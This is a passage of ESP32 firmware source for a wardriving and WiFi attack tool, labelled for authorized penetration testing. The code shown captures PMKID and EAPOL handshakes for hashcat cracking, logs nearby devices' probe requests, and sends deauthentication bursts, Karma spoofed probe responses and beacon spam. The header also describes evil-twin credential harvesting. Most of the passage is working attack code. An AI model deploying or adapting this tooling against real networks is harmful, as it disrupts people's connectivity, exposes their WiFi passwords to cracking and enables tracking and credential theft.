/*
 * ============================================================================
 *  F L L C   W A R D R I V E R   v3
 *  ─────────────────────────────────────────
 *  ESP32 autonomous WiFi / BLE intelligence platform
 *
 *  ┌─────────────────────────────────────────────────────────────────────┐
 *  │  Plug the USB tri-drive into ANY computer.  The ESP32 powers up,   │
 *  │  auto-scans every WiFi network & BLE device in range, extracts     │
 *  │  PMKID hashes, captures EAPOL handshakes, fingerprints vendors,    │
 *  │  and dumps everything to the Micro SD in Wireshark & hashcat       │
 *  │  compatible formats — all without touching a single key.           │
 *  └─────────────────────────────────────────────────────────────────────┘
 *
 *  ARCHITECTURE
 *  ────────────
 *  Core 0 (PRO_CPU):  WiFi promiscuous RX callback + frame analysis
 *  Core 1 (APP_CPU):  Main loop, serial CLI, BLE scans, SD writes,
 *                     attack state machine, autopilot sequencer
 *
 *  DATA PIPELINE
 *  ─────────────
 *  raw 802.11 frame
 *      │
 *      ├─▶ beacon / probe-resp ─▶ AP table + encryption + OUI
 *      ├─▶ probe-req           ─▶ station table + preferred networks
 *      ├─▶ data frame          ─▶ station-AP association graph
 *      ├─▶ EAPOL (0x888E)     ─▶ handshake table + .hc22000 export
 *      ├─▶ RSN IE w/ PMKID    ─▶ PMKID table  + .hc22000 export
 *      └─▶ ALL frames         ─▶ ring-buffered PCAP on SD
 *
 *  OUTPUT FILES (on Micro SD)
 *  ──────────────────────────
 *  /scans/wifi_YYYYMMDD_HHMMSS.json     – AP + station + probe JSON
 *  /scans/ble_YYYYMMDD_HHMMSS.json      – BLE device JSON
 *  /hashes/pmkid_XXXXXX.hc22000         – PMKID hashes (hashcat -m 22000)
 *  /hashes/eapol_XXXXXX.hc22000         – EAPOL hashes (hashcat -m 22000)
 *  /pcap/capture_XXXXXX.pcap            – raw 802.11 PCAP
 *  /creds/portal_creds.txt              – evil-twin harvested creds
 *  /log/session.log                     – human-readable session log
 *
 *  COMPILE
 *  ───────
 *  Board:  ESP32 Dev Module  (or any WROOM-32 / WROVER)
 *  Flash:  4 MB (default)    Partition: Huge APP (3 MB)
 *  PSRAM:  Disabled          CPU: 240 MHz
 *
 *  Arduino IDE:  Install ESP32 board package ≥ 2.0.0
 *  PlatformIO:   pio run -t upload
 *
 *  AUTHORIZED PENETRATION TESTING USE ONLY
 *  FLLC — FLLC
 * ============================================================================
 */

#include "config.h"
#include "oui.h"

#include <WiFi.h>
#include <esp_wifi.h>
#include <esp_wifi_types.h>
#include <esp_system.h>
#include <esp_task_wdt.h>
#include <SD.h>
#include <SPI.h>
#include <FS.h>
#include <BLEDevice.h>
#include <BLEScan.h>
#include <BLEAdvertisedDevice.h>
#include <WebServer.h>
#include <DNSServer.h>
#include <freertos/FreeRTOS.h>
#include <freertos/task.h>
#include <freertos/semphr.h>

// ════════════════════════════════════════════════════════════════════════════
//  802.11 FRAME STRUCTURES
// ════════════════════════════════════════════════════════════════════════════

typedef struct __attribute__((packed)) {
  uint16_t frame_ctrl;
  uint16_t duration;
  uint8_t  addr1[6];
  uint8_t  addr2[6];
  uint8_t  addr3[6];
  uint16_t seq_ctrl;
} mac_hdr_t;

// PCAP global header (libpcap)
typedef struct __attribute__((packed)) {
  uint32_t magic;       // 0xa1b2c3d4
  uint16_t ver_major;   // 2
  uint16_t ver_minor;   // 4
  int32_t  tz_offset;   // 0
  uint32_t ts_accuracy; // 0
  uint32_t snap_len;
  uint32_t link_type;
} pcap_ghdr_t;

// PCAP per-packet header
typedef struct __attribute__((packed)) {
  uint32_t ts_sec;
  uint32_t ts_usec;
  uint32_t cap_len;
  uint32_t orig_len;
} pcap_phdr_t;

// ════════════════════════════════════════════════════════════════════════════
//  DATA TABLES  (statically allocated — no heap fragmentation)
// ════════════════════════════════════════════════════════════════════════════

struct ap_t {
  uint8_t  bssid[6];
  char     ssid[33];
  int8_t   rssi;
  uint8_t  channel;
  uint8_t  enc;          // 0=open 1=WEP 2=WPA 3=WPA2 4=WPA2-ENT 5=WPA3
  bool     hidden;
  bool     wps;
  uint16_t sta_count;    // associated stations seen
  uint32_t first_seen;
  uint32_t last_seen;
  uint32_t beacon_count;
  const char *vendor;
};

struct sta_t {
  uint8_t  mac[6];
  uint8_t  bssid[6];     // currently associated AP (if known)
  int8_t   rssi;
  uint16_t probe_count;
  uint32_t first_seen;
  uint32_t last_seen;
  uint32_t data_frames;
  const char *vendor;
};

struct probe_t {
  uint8_t  mac[6];
  char     ssid[33];
  int8_t   rssi;
  uint8_t  channel;
  uint32_t ts;
};

// PMKID record  (hashcat -m 22000 line)
struct pmkid_t {
  uint8_t  pmkid[16];
  uint8_t  ap_mac[6];
  uint8_t  sta_mac[6];
  char     ssid[33];
  uint8_t  ssid_len;
};

// EAPOL handshake tracking per AP-STA pair
struct hs_t {
  uint8_t  ap_mac[6];
  uint8_t  sta_mac[6];
  char     ssid[33];
  uint8_t  ssid_len;
  // We store the full M1-M4 frames for hc22000 export
  uint8_t  msg1[512]; uint16_t msg1_len;
  uint8_t  msg2[512]; uint16_t msg2_len;
  bool     has_m1, has_m2;
  uint32_t ts;
};

struct ble_dev_t {
  char     addr[18];
  char     name[48];
  int      rssi;
  bool     connectable;
  uint32_t last_seen;
  const char *vendor;
};

// ──── Static tables ──────────────────────────────────────────────────────
static ap_t       ap_table[MAX_APS];
static sta_t      sta_table[MAX_STATIONS];
static probe_t    probe_table[MAX_PROBES];
static pmkid_t    pmkid_table[MAX_PMKIDS];
static hs_t       hs_table[MAX_HANDSHAKES];
static ble_dev_t  ble_table[MAX_BLE_DEVICES];

static volatile int ap_count     = 0;
static volatile int sta_count    = 0;
static volatile int probe_count  = 0;
static volatile int pmkid_count  = 0;
static volatile int hs_count     = 0;
static volatile int ble_count    = 0;

// ──── Concurrency ────────────────────────────────────────────────────────
static SemaphoreHandle_t table_mutex;
static SemaphoreHandle_t sd_mutex;

// ──── State ──────────────────────────────────────────────────────────────
enum mode_t {
  M_IDLE, M_SCAN_WIFI, M_SCAN_BLE, M_SNIFF, M_DEAUTH,
  M_BEACON, M_EVIL_TWIN, M_KARMA, M_AUTOPILOT
};
static volatile mode_t    g_mode          = M_IDLE;
static volatile uint8_t   g_channel       = 1;
static volatile bool      g_hop           = true;
static volatile uint32_t  g_total_pkts    = 0;
static volatile uint32_t  g_total_mgmt    = 0;
static volatile uint32_t  g_total_data    = 0;
static volatile uint32_t  g_session_start = 0;
static volatile uint32_t  g_last_flush    = 0;
static volatile uint32_t  g_cycle_count   = 0;
static bool               g_sd_ok         = false;

// PCAP file handle
static File g_pcap_file;
static volatile bool      g_pcap_active   = false;
static volatile uint32_t  g_pcap_pkts     = 0;

// Evil twin
static WebServer *g_web   = nullptr;
static DNSServer *g_dns   = nullptr;
static char       g_twin_ssid[33] = "";
static bool       g_twin_active   = false;
static int        g_cred_count    = 0;

// Serial command buffer
static char g_cmd[256];
static int  g_cmd_pos = 0;

// ════════════════════════════════════════════════════════════════════════════
//  UTILITY
// ════════════════════════════════════════════════════════════════════════════

static void mac2str(const uint8_t *m, char *buf) {
  sprintf(buf, "%02X:%02X:%02X:%02X:%02X:%02X", m[0],m[1],m[2],m[3],m[4],m[5]);
}

static void str2mac(const char *s, uint8_t *m) {
  sscanf(s, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx", &m[0],&m[1],&m[2],&m[3],&m[4],&m[5]);
}

static bool mac_eq(const uint8_t *a, const uint8_t *b) {
  return memcmp(a, b, 6) == 0;
}

static bool mac_is_broadcast(const uint8_t *m) {
  return m[0]==0xFF && m[1]==0xFF && m[2]==0xFF && m[3]==0xFF && m[4]==0xFF && m[5]==0xFF;
}

static const char *enc_str(uint8_t e) {
  static const char *t[] = {"OPEN","WEP","WPA","WPA2","WPA2-E","WPA3"};
  return (e <= 5) ? t[e] : "?";
}

static void slog(const char *fmt, ...) {
  char buf[256];
  va_list ap;
  va_start(ap, fmt);
  vsnprintf(buf, sizeof(buf), fmt, ap);
  va_end(ap);
  Serial.println(buf);
}

// ════════════════════════════════════════════════════════════════════════════
//  TABLE LOOKUPS
// ════════════════════════════════════════════════════════════════════════════

static int find_ap(const uint8_t *bssid) {
  for (int i = 0; i < ap_count; i++)
    if (mac_eq(ap_table[i].bssid, bssid)) return i;
  return -1;
}

static int find_sta(const uint8_t *mac) {
  for (int i = 0; i < sta_count; i++)
    if (mac_eq(sta_table[i].mac, mac)) return i;
  return -1;
}

static int find_hs(const uint8_t *ap, const uint8_t *sta) {
  for (int i = 0; i < hs_count; i++)
    if (mac_eq(hs_table[i].ap_mac, ap) && mac_eq(hs_table[i].sta_mac, sta)) return i;
  return -1;
}

// ════════════════════════════════════════════════════════════════════════════
//  802.11 INFORMATION ELEMENT PARSER
// ════════════════════════════════════════════════════════════════════════════

// Parse tagged parameters from beacon/probe-resp body
// Returns encryption type and extracts SSID, WPS flag, PMKID if present
static uint8_t parse_ies(const uint8_t *body, int body_len,
                         char *ssid_out, bool *wps_out,
                         uint8_t *pmkid_out, bool *has_pmkid,
                         const uint8_t *ap_mac, const uint8_t *sta_mac) {
  *wps_out    = false;
  *has_pmkid  = false;
  ssid_out[0] = '\0';

  // Fixed fields: Timestamp(8) + BeaconInterval(2) + Capability(2) = 12
  if (body_len < 12) return 0;

  uint16_t capability = body[10] | (body[11] << 8);
  bool privacy = capability & 0x0010;

  const uint8_t *ie  = body + 12;
  int            rem = body_len - 12;
  bool has_rsn = false, has_wpa = false;

  while (rem >= 2) {
    uint8_t id  = ie[0];
    uint8_t len = ie[1];
    if (len > rem - 2) break;
    const uint8_t *val = ie + 2;

    switch (id) {
      case 0: // SSID
        if (len <= 32) { memcpy(ssid_out, val, len); ssid_out[len] = '\0'; }
        break;

      case 48: { // RSN (WPA2/WPA3)
        has_rsn = true;
        // Check for PMKID in RSN IE
        // RSN structure: Version(2) + GroupCipher(4) + PairwiseCnt(2) + Pairwise(4*n) +
        //                AKMCnt(2) + AKM(4*n) + RSNCap(2) + PMKIDCnt(2) + PMKID(16*n)
        if (len >= 22) {
          int offset = 2; // skip version
          offset += 4;    // skip group cipher
          if (offset + 2 <= len) {
            uint16_t pw_cnt = val[offset] | (val[offset+1] << 8);
            offset += 2 + pw_cnt * 4;
          }
          if (offset + 2 <= len) {
            uint16_t akm_cnt = val[offset] | (val[offset+1] << 8);
            offset += 2 + akm_cnt * 4;
          }
          if (offset + 2 <= len) {
            offset += 2; // RSN capabilities
          }
          // PMKID list
          if (offset + 2 <= len) {
            uint16_t pmkid_cnt = val[offset] | (val[offset+1] << 8);
            offset += 2;
            if (pmkid_cnt > 0 && offset + 16 <= len) {
              // Validate PMKID is not all zeros
              bool all_zero = true;
              for (int k = 0; k < 16; k++)
                if (val[offset + k] != 0) { all_zero = false; break; }
              if (!all_zero) {
                memcpy(pmkid_out, &val[offset], 16);
                *has_pmkid = true;
              }
            }
          }
        }
        break;
      }

      case 221: // Vendor specific
        if (len >= 4) {
          // Microsoft WPA OUI: 00:50:F2:01
          if (val[0]==0x00 && val[1]==0x50 && val[2]==0xF2 && val[3]==0x01)
            has_wpa = true;
          // Microsoft WPS OUI: 00:50:F2:04
          if (val[0]==0x00 && val[1]==0x50 && val[2]==0xF2 && val[3]==0x04)
            *wps_out = true;
        }
        break;
    }
    ie  += 2 + len;
    rem -= 2 + len;
  }

  if (!privacy) return 0;
  if (has_rsn)  return 3; // WPA2
  if (has_wpa)  return 2; // WPA
  return 1;               // WEP
}

// ════════════════════════════════════════════════════════════════════════════
//  EAPOL PARSER  (extract key data for hashcat hc22000)
// ════════════════════════════════════════════════════════════════════════════

// EAPOL key message number detection from Key Info field
static int eapol_msg_num(const uint8_t *eapol_body) {
  // eapol_body points to 802.1X Authentication header:
  // [0] Version  [1] Type  [2-3] Length
  // Then Key Descriptor: [4] Descriptor Type
  // [5-6] Key Information
  if (eapol_body[1] != 0x03) return 0; // Type must be EAPOL-Key
  uint16_t key_info = (eapol_body[5] << 8) | eapol_body[6];

  bool pairwise = key_info & 0x0008;
  bool install  = key_info & 0x0040;
  bool ack      = key_info & 0x0080;
  bool mic      = key_info & 0x0100;
  bool secure   = key_info & 0x0200;

  if (pairwise && ack && !mic)                   return 1; // M1
  if (pairwise && mic && !ack && !install && !secure) return 2; // M2
  if (pairwise && ack && mic && install && secure)    return 3; // M3
  if (pairwise && mic && !ack && secure)              return 4; // M4
  return 0;
}

// ════════════════════════════════════════════════════════════════════════════
//  PROMISCUOUS RX CALLBACK (runs on Core 0 / PRO_CPU)
// ════════════════════════════════════════════════════════════════════════════

static void IRAM_ATTR wifi_rx_cb(void *buf, wifi_promiscuous_pkt_type_t type) {
  if (!buf) return;
  const wifi_promiscuous_pkt_t *pkt = (wifi_promiscuous_pkt_t *)buf;
  const uint8_t *payload = pkt->payload;
  int len = pkt->rx_ctrl.sig_len;
  if (len < 24) return;

  g_total_pkts++;

  const mac_hdr_t *hdr = (const mac_hdr_t *)payload;
  uint8_t ftype = (hdr->frame_ctrl & 0x0C) >> 2;
  uint8_t fsub  = (hdr->frame_ctrl & 0xF0) >> 4;

  // ──── MANAGEMENT FRAMES ────────────────────────────────────────────────
  if (ftype == 0) {
    g_total_mgmt++;

    // Beacon (8) or Probe Response (5)
    if ((fsub == 8 || fsub == 5) && len > 36) {
      if (xSemaphoreTake(table_mutex, pdMS_TO_TICKS(5)) == pdTRUE) {
        char ssid[33] = {0};
        bool wps = false;
        uint8_t pmkid_buf[16];
        bool has_pmkid = false;

        uint8_t enc = parse_ies(payload + 24, len - 24,
                                ssid, &wps, pmkid_buf, &has_pmkid,
                                hdr->addr3, hdr->addr2);

        int idx = find_ap(hdr->addr3);
        if (idx < 0 && ap_count < MAX_APS) {
          idx = ap_count++;
          memset(&ap_table[idx], 0, sizeof(ap_t));
          memcpy(ap_table[idx].bssid, hdr->addr3, 6);
          ap_table[idx].first_seen = millis();
          ap_table[idx].vendor = oui_lookup(hdr->addr3);
        }
        if (idx >= 0) {
          strncpy(ap_table[idx].ssid, ssid, 32);
          ap_table[idx].rssi    = pkt->rx_ctrl.rssi;
          ap_table[idx].channel = pkt->rx_ctrl.channel;
          ap_table[idx].enc     = enc;
          ap_table[idx].hidden  = (ssid[0] == '\0');
          ap_table[idx].wps     = wps;
          ap_table[idx].last_seen = millis();
          ap_table[idx].beacon_count++;
        }

        // PMKID extraction from RSN IE in first M1 response
        if (has_pmkid && pmkid_count < MAX_PMKIDS) {
          // Deduplicate
          bool dup = false;
          for (int p = 0; p < pmkid_count; p++) {
            if (memcmp(pmkid_table[p].pmkid, pmkid_buf, 16) == 0) { dup = true; break; }
          }
          if (!dup) {
            memcpy(pmkid_table[pmkid_count].pmkid, pmkid_buf, 16);
            memcpy(pmkid_table[pmkid_count].ap_mac, hdr->addr3, 6);
            memcpy(pmkid_table[pmkid_count].sta_mac, hdr->addr2, 6);
            strncpy(pmkid_table[pmkid_count].ssid, ssid, 32);
            pmkid_table[pmkid_count].ssid_len = strlen(ssid);
            pmkid_count++;
            slog("[PMKID] %s (%s) — new PMKID captured!", ssid, oui_lookup(hdr->addr3));
          }
        }

        xSemaphoreGive(table_mutex);
      }
    }

    // Probe Request (4)
    if (fsub == 4 && len > 24) {
      if (xSemaphoreTake(table_mutex, pdMS_TO_TICKS(3)) == pdTRUE) {
        // Extract SSID
        char ssid[33] = {0};
        if (len > 26) {
          uint8_t slen = payload[25];
          if (slen > 0 && slen <= 32)
            memcpy(ssid, &payload[26], slen);
        }

        // Store probe
        if (probe_count < MAX_PROBES) {
          memcpy(probe_table[probe_count].mac, hdr->addr2, 6);
          strncpy(probe_table[probe_count].ssid, ssid, 32);
          probe_table[probe_count].rssi = pkt->rx_ctrl.rssi;
          probe_table[probe_count].channel = pkt->rx_ctrl.channel;
          probe_table[probe_count].ts = millis();
          probe_count++;
        }

        // Update station table
        int si = find_sta(hdr->addr2);
        if (si < 0 && sta_count < MAX_STATIONS) {
          si = sta_count++;
          memset(&sta_table[si], 0, sizeof(sta_t));
          memcpy(sta_table[si].mac, hdr->addr2, 6);
          sta_table[si].first_seen = millis();
          sta_table[si].vendor = oui_lookup(hdr->addr2);
        }
        if (si >= 0) {
          sta_table[si].probe_count++;
          sta_table[si].rssi = pkt->rx_ctrl.rssi;
          sta_table[si].last_seen = millis();
        }

        // Karma response
        if (g_mode == M_KARMA && ssid[0] != '\0') {
          // Reply with probe response for requested SSID
          send_karma_response(ssid, hdr->addr2);
        }

        xSemaphoreGive(table_mutex);
      }
    }
  }

  // ──── DATA FRAMES ──────────────────────────────────────────────────────
  if (ftype == 2) {
    g_total_data++;

    uint8_t toDS   = (hdr->frame_ctrl & 0x0100) >> 8;
    uint8_t fromDS = (hdr->frame_ctrl & 0x0200) >> 9;
    const uint8_t *sta_mac = NULL;
    const uint8_t *ap_mac  = NULL;

    if (toDS && !fromDS) {        // client → AP
      sta_mac = hdr->addr2;
      ap_mac  = hdr->addr1;
    } else if (!toDS && fromDS) { // AP → client
      sta_mac = hdr->addr1;
      ap_mac  = hdr->addr2;
    }

    if (sta_mac && ap_mac && !mac_is_broadcast(sta_mac)) {
      if (xSemaphoreTake(table_mutex, pdMS_TO_TICKS(3)) == pdTRUE) {
        int si = find_sta(sta_mac);
        if (si < 0 && sta_count < MAX_STATIONS) {
          si = sta_count++;
          memset(&sta_table[si], 0, sizeof(sta_t));
          memcpy(sta_table[si].mac, sta_mac, 6);
          sta_table[si].first_seen = millis();
          sta_table[si].vendor = oui_lookup(sta_mac);
        }
        if (si >= 0) {
          memcpy(sta_table[si].bssid, ap_mac, 6);
          sta_table[si].rssi = pkt->rx_ctrl.rssi;
          sta_table[si].data_frames++;
          sta_table[si].last_seen = millis();
        }

        // Update AP station count
        int ai = find_ap(ap_mac);
        if (ai >= 0) {
          // Count unique stations
          int cnt = 0;
          for (int s = 0; s < sta_count; s++)
            if (mac_eq(sta_table[s].bssid, ap_mac)) cnt++;
          ap_table[ai].sta_count = cnt;
        }
        xSemaphoreGive(table_mutex);
      }

      // ── EAPOL detection (EtherType 0x888E) ──
      // Data frames have LLC/SNAP header after MAC header (+ QoS if subtype 8)
      int hdr_len = 24;
      if ((fsub & 0x08) != 0) hdr_len += 2; // QoS

      // Search for 0x888E in the data portion
      for (int off = hdr_len; off < len - 5; off++) {
        if (payload[off] == 0x88 && payload[off+1] == 0x8E) {
          const uint8_t *eapol = &payload[off + 2]; // skip EtherType
          int eapol_len = len - off - 2;
          if (eapol_len < 99) break; // Min EAPOL-Key length

          int msg = eapol_msg_num(eapol);
          if (msg == 0) break;

          if (xSemaphoreTake(table_mutex, pdMS_TO_TICKS(5)) == pdTRUE) {
            // Determine AP and STA from ToDS/FromDS
            const uint8_t *real_ap  = (msg == 1 || msg == 3) ? hdr->addr2 : hdr->addr1;
            const uint8_t *real_sta = (msg == 1 || msg == 3) ? hdr->addr1 : hdr->addr2;

            int hi = find_hs(real_ap, real_sta);
            if (hi < 0 && hs_count < MAX_HANDSHAKES) {
              hi = hs_count++;
              memset(&hs_table[hi], 0, sizeof(hs_t));
              memcpy(hs_table[hi].ap_mac, real_ap, 6);
              memcpy(hs_table[hi].sta_mac, real_sta, 6);
              // Get SSID from AP table
              int ai2 = find_ap(real_ap);
              if (ai2 >= 0) {
                strncpy(hs_table[hi].ssid, ap_table[ai2].ssid, 32);
                hs_table[hi].ssid_len = strlen(ap_table[ai2].ssid);
              }
            }

            if (hi >= 0) {
              if (msg == 1 && !hs_table[hi].has_m1) {
                int copy_len = (eapol_len > 510) ? 510 : eapol_len;
                memcpy(hs_table[hi].msg1, eapol, copy_len);
                hs_table[hi].msg1_len = copy_len;
                hs_table[hi].has_m1 = true;
                hs_table[hi].ts = millis();
                slog("[EAPOL] M1 captured for %s", hs_table[hi].ssid);
              }
              if (msg == 2 && !hs_table[hi].has_m2) {
                int copy_len = (eapol_len > 510) ? 510 : eapol_len;
                memcpy(hs_table[hi].msg2, eapol, copy_len);
                hs_table[hi].msg2_len = copy_len;
                hs_table[hi].has_m2 = true;
                slog("[EAPOL] M2 captured for %s — HANDSHAKE COMPLETE!", hs_table[hi].ssid);
              }
            }
            xSemaphoreGive(table_mutex);
          }
          break;
        }
      }
    }
  }

  // ──── PCAP WRITE (lock-free ring: SD writes on Core 1) ─────────────────
  if (g_pcap_active && g_sd_ok) {
    if (xSemaphoreTake(sd_mutex, pdMS_TO_TICKS(2)) == pdTRUE) {
      if (g_pcap_file) {
        pcap_phdr_t ph;
        ph.ts_sec  = millis() / 1000;
        ph.ts_usec = (millis() % 1000) * 1000;
        uint32_t cap = (len > PCAP_SNAP_LEN) ? PCAP_SNAP_LEN : len;
        ph.cap_len  = cap;
        ph.orig_len = len;
        g_pcap_file.write((uint8_t *)&ph, sizeof(ph));
        g_pcap_file.write(payload, cap);
        g_pcap_pkts++;
        if (g_pcap_pkts % 200 == 0) g_pcap_file.flush();
      }
      xSemaphoreGive(sd_mutex);
    }
  }
}

// ════════════════════════════════════════════════════════════════════════════
//  KARMA RESPONSE
// ════════════════════════════════════════════════════════════════════════════

void send_karma_response(const char *ssid, const uint8_t *client) {
  uint8_t f[128];
  int p = 0;
  f[p++]=0x50; f[p++]=0x00; // Probe Response
  f[p++]=0x00; f[p++]=0x00; // Duration
  memcpy(&f[p], client, 6); p+=6;
  // Random source/bssid
  uint8_t fake[6] = {0x02, 0xFE, (uint8_t)(millis()&0xFF), (uint8_t)((millis()>>8)&0xFF), 0xFE, 0x01};
  memcpy(&f[p], fake, 6); p+=6;
  memcpy(&f[p], fake, 6); p+=6;
  f[p++]=0x00; f[p++]=0x00; // Seq
  // Fixed params (12 bytes)
  memset(&f[p], 0, 12); f[p+8]=0x64; f[p+10]=0x31; f[p+11]=0x04; p+=12;
  // SSID IE
  int slen = strlen(ssid); if (slen>32) slen=32;
  f[p++]=0x00; f[p++]=slen;
  memcpy(&f[p], ssid, slen); p+=slen;
  // Rates
  f[p++]=0x01; f[p++]=0x04;
  f[p++]=0x82; f[p++]=0x84; f[p++]=0x8B; f[p++]=0x96;
  // Channel
  f[p++]=0x03; f[p++]=0x01; f[p++]=g_channel;

  esp_wifi_80211_tx(WIFI_IF_STA, f, p, false);
}

// ════════════════════════════════════════════════════════════════════════════
//  DEAUTH TX
// ════════════════════════════════════════════════════════════════════════════

static uint8_t g_deauth_bssid[6];
static uint8_t g_deauth_target[6] = {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};
static volatile bool g_deauth_active = false;
static volatile uint32_t g_deauth_sent = 0;

static void send_deauth_burst() {
  uint8_t f[26];
  for (int i = 0; i < DEAUTH_BURST; i++) {
    // AP → client
    f[0]=0xC0; f[1]=0x00; f[2]=0x00; f[3]=0x00;
    memcpy(&f[4], g_deauth_target, 6);
    memcpy(&f[10], g_deauth_bssid, 6);
    memcpy(&f[16], g_deauth_bssid, 6);
    f[22]=0x00; f[23]=0x00; f[24]=0x07; f[25]=0x00;
    esp_wifi_80211_tx(WIFI_IF_STA, f, 26, false);

    // Client → AP
    memcpy(&f[4], g_deauth_bssid, 6);
    memcpy(&f[10], g_deauth_target, 6);
    esp_wifi_80211_tx(WIFI_IF_STA, f, 26, false);

    g_deauth_sent += 2;
    delayMicroseconds(DEAUTH_DELAY_US);
  }
}

// ════════════════════════════════════════════════════════════════════════════
//  BEACON SPAM
// ════════════════════════════════════════════════════════════════════════════

static const char *g_beacon_ssids[] = {
  "FBI Surveillance Van #3", "NSA Node 7", "Free WiFi",
  "Totally Not Hacking", "Pretty Fly for a WiFi", "Wu-Tang LAN",
  "The LAN Before Time", "LAN Solo", "Abraham Linksys",
  "Benjamin FrankLAN", "Bill Wi the Science Fi", "404 Not Found",
  "Loading...", "Connecting...", "Silence of the LANs",
  "The Promised LAN", "Winternet is Coming", "Drop It Like Its Hotspot",
  "Get Off My LAN", "No More Mr WiFi", "Martin Router King",
  "John Wilkes Bluetooth", "Virus Distribution Center",
  "Searching...", "It Burns When IP", "Nacho WiFi",
  "New England Clam Router", "IRS Audit Division", "Test Network Ignore",
  "This LAN Is My LAN"
};
static const int g_beacon_count = sizeof(g_beacon_ssids)/sizeof(g_beacon_ssids[0]);
static volatile bool g_beacon_active = false;

static void send_beacon(const char *ssid, uint8_t ch) {
  uint8_t f[128]; int p=0;
  f[p++]=0x80; f[p++]=0x00; f[p++]=0x00; f[p++]=0x00;
  memset(&f[p], 0xFF, 6); p+=6;
  uint8_t src[6]={0x02,(uint8_t)(esp_random()&0xFE),(uint8_t)esp_random(),(uint8_t)esp_random(),(uint8_t)esp_random(),(uint8_t)esp_random()};
  memcpy(&f[p],src,6); p+=6; memcpy(&f[p],src,6); p+=6;
  f[p++]=0; f[p++]=0;
  uint32_t t=micros(); memcpy(&f[p],&t,4); memset(&f[p+4],0,4); p+=8;
  f[p++]=0x64; f[p++]=0x00; f[p++]=0x31; f[p++]=0x04;
  int sl=strlen(ssid); if(sl>32)sl=32;
  f[p++]=0x00; f[p++]=sl; memcpy(&f[p],ssid,sl); p+=sl;
  f[p++]=0x01; f[p++]=0x08;
  uint8_t r[]={0x82,0x84,0x8B,0x96,0x24,0x30,0x48,0x6C};
  memcpy(&f[p],r,8); p+=8;
  f[p++]=0x03; f[p++]=0x01; f[p++]=ch;
  esp_wifi_80211_tx(WIFI_IF_STA, f, p, false);
}

// ════════════════════════════════════════════════════════════════════════════
//  SD CARD — INIT + FILE OPS
// ════════════════════════════════════════════════════════════════════════════

static bool sd_init() {
  SPI.begin(PIN_SD_CLK, PIN_SD_MISO, PIN_SD_MOSI, PIN_SD_CS);
  if (!SD.begin(PIN_SD_CS)) {
    slog("[SD] Mount failed — check wiring or card");
    return false;
  }
  uint64_t mb = SD.cardSize() / (1024*1024);
  slog("[SD] Card mounted — %lu MB total, %lu MB free",
       (unsigned long)mb, (unsigned long)(SD.totalBytes()? (SD.totalBytes()-SD.usedBytes())/(1024*1024) : mb));

  SD.mkdir("/scans");
  SD.mkdir("/hashes");
  SD.mkdir("/pcap");
  SD.mkdir("/creds");
  SD.mkdir("/log");
  return true;
}

static String timestamp_name(const char *prefix, const char *ext) {
  char buf[64];
  snprintf(buf, sizeof(buf), "%s/%s_%06lu.%s", prefix, prefix+1, millis()/1000, ext);
  return String(buf);
}

// ──── PCAP file ──────────────────────────────────────────────────────────

static void pcap_start() {
  if (!g_sd_ok) { slog("[PCAP] No SD card"); return; }
  if (g_pcap_active) { slog("[PCAP] Already recording"); return; }

  String path = "/pcap/cap_" + String(millis()/1000) + ".pcap";
  if (xSemaphoreTake(sd_mutex, pdMS_TO_TICKS(100)) == pdTRUE) {
    g_pcap_file = SD.open(path, FILE_WRITE);
    if (g_pcap_file) {
      pcap_ghdr_t gh = {0xa1b2c3d4, 2, 4, 0, 0, PCAP_SNAP_LEN, PCAP_LINKTYPE};
      g_pcap_file.write((uint8_t*)&gh, sizeof(gh));
      g_pcap_active = true;
      g_pcap_pkts = 0;
      slog("[PCAP] Started → %s", path.c_str());
    }
    xSemaphoreGive(sd_mutex);
  }
}

static void pcap_stop() {
  if (!g_pcap_active) return;
  if (xSemaphoreTake(sd_mutex, pdMS_TO_TICKS(500)) == pdTRUE) {
    g_pcap_active = false;
    if (g_pcap_file) { g_pcap_file.flush(); g_pcap_file.close(); }
    slog("[PCAP] Stopped — %lu packets", g_pcap_pkts);
    xSemaphoreGive(sd_mutex);
  }
}

// ──── JSON scan dump ─────────────────────────────────────────────────────

static void save_wifi_json() {
  if (!g_sd_ok) return;
  String path = "/scans/wifi_" + String(millis()/1000) + ".json";

  if (xSemaphoreTake(sd_mutex, pdMS_TO_TICKS(500)) == pdTRUE) {
    File f = SD.open(path, FILE_WRITE);
    if (f) {
      f.printf("{\"fw\":\"%s\",\"cycle\":%lu,\"uptime\":%lu,", FW_VERSION, g_cycle_count, millis()/1000);
      f.printf("\"total_pkts\":%lu,\"aps\":%d,\"stas\":%d,\"probes\":%d,\"pmkids\":%d,\"handshakes\":%d,\n",
               g_total_pkts, ap_count, sta_count, probe_count, pmkid_count, hs_count);

      // APs
      f.print("\"access_points\":[\n");
      for (int i = 0; i < ap_count; i++) {
        char mac[18]; mac2str(ap_table[i].bssid, mac);
        if (i > 0) f.print(",\n");
        f.printf("{\"bssid\":\"%s\",\"ssid\":\"%s\",\"rssi\":%d,\"ch\":%d,\"enc\":\"%s\",\"wps\":%s,\"hidden\":%s,\"vendor\":\"%s\",\"clients\":%d,\"beacons\":%lu}",
                 mac, ap_table[i].ssid, ap_table[i].rssi, ap_table[i].channel,
                 enc_str(ap_table[i].enc), ap_table[i].wps?"true":"false",
                 ap_table[i].hidden?"true":"false",
                 ap_table[i].vendor ? ap_table[i].vendor : "?",
                 ap_table[i].sta_count, ap_table[i].beacon_count);
      }
      f.print("],\n");

      // Stations
      f.print("\"stations\":[\n");
      for (int i = 0; i < sta_count; i++) {
        char mac[18]; mac2str(sta_table[i].mac, mac);
        char bss[18]; mac2str(sta_table[i].bssid, bss);
        if (i > 0) f.print(",\n");
        f.printf("{\"mac\":\"%s\",\"bssid\":\"%s\",\"rssi\":%d,\"probes\":%d,\"data\":%lu,\"vendor\":\"%s\"}",
                 mac, bss, sta_table[i].rssi, sta_table[i].probe_count,
                 sta_table[i].data_frames,
                 sta_table[i].vendor ? sta_table[i].vendor : "?");
      }
      f.print("],\n");

      // Probes (last 100 for space)
      int pstart = (probe_count > 100) ? probe_count - 100 : 0;
      f.print("\"probes\":[\n");
      for (int i = pstart; i < probe_count; i++) {
        char mac[18]; mac2str(probe_table[i].mac, mac);
        if (i > pstart) f.print(",\n");
        f.printf("{\"mac\":\"%s\",\"ssid\":\"%s\",\"rssi\":%d,\"ch\":%d}",
                 mac, probe_table[i].ssid, probe_table[i].rssi, probe_table[i].channel);
      }
      f.print("]}\n");
      f.close();
      slog("[SD] WiFi JSON saved → %s", path.c_str());
    }
